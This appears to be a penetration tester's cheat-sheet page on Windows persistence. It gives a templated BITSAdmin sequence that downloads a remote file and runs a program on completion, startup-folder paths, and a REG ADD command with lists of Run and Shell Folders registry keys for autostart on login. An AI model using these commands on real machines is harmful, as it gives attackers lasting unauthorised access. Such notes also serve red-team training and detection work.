---
title: "Persistence"
date: 2020-07-17T20:59:33+02:00
draft: false
---

#### LOLBAS (Living Off The Land Binaries and Scripts)
https://lolbas-project.github.io/


#### BITSAdmin
Persistence:
```
$ bitsadmin /Create <job_name>
$ bitsadmin /Addfile <job_name> <remote_path> <local_path>
$ bitsadmin /SetNotifyFlags <job_name> 1
$ bitsadmin /SetNotifyCmdLine <job_name> <program_name> [program_parameters]
$ bitsadmin /SetMinRetryDelay <job_name> 30
$ bitsadmin /Resume <job_name>
```

#### Startup Folder
Executables that are placed in the users' startup folder will get executed automatically on startup.
```
$ C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```
In the case of Administrator privileges the startup folder is as follows:
```
$ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

#### Registry Run Keys
Entries added to the Run Keys in the Current User Registry Hive (HKCU) will get executed every time the compromised user logs in. The following list shows the most common locations to achieve persistence under the context of the current user.
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
The following command shows setting one of these registry keys to run an executable at startup:
```
$ REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <filepath>
```
Entries added to the Run Keys in the System or Local Machine Registry Hive (HKCU) will get executed every time any user logs in into the system. Access to these will need admin rights though.
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

Abuse is the same as the command above. Additionally, there are a few other registry locations that can be used to create and place start up folder items that will of course also get executed at log in:
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

#### References
https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-1
https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-2
